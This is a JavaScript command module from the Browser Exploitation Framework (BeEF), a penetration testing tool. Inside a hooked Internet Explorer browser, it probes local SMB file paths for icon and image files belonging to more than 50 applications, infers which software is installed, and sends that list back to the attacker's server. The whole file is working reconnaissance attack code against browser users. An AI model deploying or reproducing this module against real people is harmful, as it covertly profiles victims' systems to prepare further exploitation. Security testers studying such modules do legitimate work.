//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

          var files = [
        "Adobe/Reader 9.0/Reader/Tracker/add_reviewer.gif",
        "NetWaiting/Logon.bmp",
        "Windows NT/Pinball/table.bmp",
        "InterVideo/WinDVD/Skins/WinDVD 5/Audio SRS Subpanel/Audio_SRS_Subpanel_Base_Mask.bmp",
        "Java/jre1.6.0_02/lib/images/cursors/invalid32x32.gif",
        "Common Files/Roxio Shared/9.0/Tutorial/Graphics/archive.gif",
        "Windows Sidebar/Gadgets/Weather.Gadget/images/1px.gif", 
        "Pinnacle/Shared Files/Pixie/Register/hdr_register_1.gif",
        "Adobe/Reader 8.0/Reader/BeyondReader/ENU/Onramp/acrobat.gif",
        "eFax Messenger 4.3/Media/ENU/confidential.gif",
        "InterActual/InterActual Player/help/images/btm_bckg.gif",
        "Intuit/QuickBooks 2007/Components/Help/Updates/bolt.gif",
        "Java/jre1.5.0_11/lib/images/cursors/win32_CopyDrop32x32.gif",
        "Macromedia/Flash 8/en/First Run/HelpPanel/_sharedassets/check.gif",
        "Microsoft Dynamics CRM/Client/res/web/_imgs/configure.gif",
        "Microsoft Office/Live Meeting 8/Console/Playback/Engine/img/dropdown-arrow.gif",
        "Microsoft Visual Studio 8/Common7/IDE/VBExpress/ProjectTemplatesCache/1033/MovieCollection.zip/Documentation/images/side-vb.gif",
        "Mozilla Firefox/res/broken-image.gif",
        "Mozilla Thunderbird/res/grabber.gif",
        "TechSmith/SnagIt 9/HTML_Content/add-in.gif",
        "VMware/VMware Player/help/images/collapse.gif",
        "WildPackets/OmniPeek Personal/1033/Html/expert-red-yellow-on.gif",
        "FreeMind/accessories/hide.png",
        "HP/Digital Imaging/Skins/oov1/bc/img/bc-backLogo.png",
        "Movie Maker/Shared/news.png",
        "MySQL/MySQL Tools for 5.0/images/grt/db/column.png",
        "Safari/Safari.resources/compass.png",
        "ThinkVantage Fingerprint Software/rsc/logon.png",
        "Trillian/plugins/GoodNews/icons/logo.png",
        "Trillian/users/default/cache/account-AIM-offline.png",
        "VideoLAN/VLC/http/images/delete.png",
        "Virtual Earth 3D/Data/Atmosphere.png",
        "Windows Media Connect 2/wmc_bw120.png",
        "Analog Devices/SoundMAX/CPApp.ico",
        "AT&T/Communication Manager/desktop.ico",
        "ATI Technologies/ATI.ACE/branding.ico",
        "Canon/ZoomBrowser EX/Program/CIGLibDisplayIcon.ico",
        "CDBurnerXP Pro 3/Resources/cdbxp.ico",
        "DivX/divxdotcom.ico",
        "Fiddler/IE_Toolbar.ico",
        "HP/SwfScan/SwfScan.ico",
        "iPhone Configuration Utility/Document-Config.ico",
        "Microsoft Device Emulator/1.0/emulator.ico",
        "MSN/MSNCoreFiles/Install/msnms.ico",
        "OpenVPN/openvpn.ico",
        "Paros/paros_logo.ico",
        "Adobe/Photoshop 6.0/Help/images/banner.jpg",
        "iTunes/iTunes.Resources/genre-blues.jpg",
        "Source Insight 3/images/SubBack.jpg",
        "Canon/CameraWindow/MyCameraFiles/VI_JPG/XMAS22_VI01.JPG",
        "Microsoft Office/OFFICE11/REFBAR.ICO",
        "Microsoft Office/OFFICE12/REFBAR.ICO",
        "Windows Media Player/Network Sharing/wmpnss_color48.jpg",
                       ]
      var descriptions = [
        "Adobe Reader 9.0",
        "WinDVD",
        "Windows Pinball",
        "Conexant NetWaiting",
        "JRE 1.6.0_22",
        "Roxio 9.0",
        "Windows Weather Gadget",
        "Pinnacle",
        "Adobe Reader 8.0",
        "eFax Manager 4.0",
        "Interactual Player",
        "Quickbooks",
        "JRE 1.5.0_11",
        "Flash 8",
        "Microsoft CRM",
        "Microsoft Live Meeting 8",
        "Microsoft Visual Studio 8",
        "Mozilla Firefox",
        "Mozilla Thunderbird",
        "Snagit 9",
        "VMware Player",
        "Omnipeek Personal",
        "Freemind",
        "HP Digital Imaging",
        "Windows Movie Maker",
        "MySQL Tools for 5.0",
        "Safari",
        "ThinkVantage Fingerprint Software",
        "Trillian Plugin GoodNews",
        "Trillian",
        "VideoLAN VLC",
        "Microsoft Virtial Earth 3D",
        "Windows Media Connect 2",
        "SoundMAX",
        "AT&T Communications Manager",
        "ATI Technologies ATI.ACE",
        "Canon ZoomBrowser",
        "CDBurnerXP Pro 3",
        "DivX",
        "Fiddler",
        "HP's SwfScan",
        "iPhone Configuration Utility",
        "Microsoft Device Emulator",
        "MSN",
        "OpenVPN",
        "Paros",
        "Adobe Photoshop 6.0",
        "iTunes",
        "Source Insight 3",
        "Canon CameraWindow",
        "Microsoft Office 11",
        "Microsoft Office 12",
        "Windows Media Player"
                              ]
                              
    if (navigator.appName != "Microsoft Internet Explorer") {
        result = 'Software detection module only works in IE (so far)';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
    
    // Using IE lets test for smb enum    
    } else { 
     	var pic1 = new Image();
        pic1.src= "file:///\\127.0.0.1/C$/WINDOWS/system32/ntimage.gif";
        var pic2 = new Image();
        pic2.src= "file:///\\127.0.0.1/C$/Windows/Web/Wallpaper/img1.jpg";

        if (pic1.width == 28 && pic2.width == 28) {
            result = 'SMB method of detecting software failed';
            beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
            
        // smb enum is working lets look for installed software    
        } else { 
        	result = '';
            var sixtyfourbitvista = 0;
        	for (var x = 0; x < files.length; x++) {
            	var pic1 = new Image();
            	pic1.src= "file:///\\127.0.0.1/C$/Program Files/" + files[x];
            	
            	if (pic1.width != 28) { 
                	result += descriptions[x];
                	result += ' and ';
                
            	} else {
                	pic1.src= "file:///\\127.0.0.1/C$/Program Files (x86)/" + files[x];
                	if (pic1.width != 28) { 
                    	result += descriptions[x];
                    	result += ' and ';

                    	sixtyfourbitvista = 1;
                	}
            	}
        	} 
        	
        	 beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
        }
    }
    
});
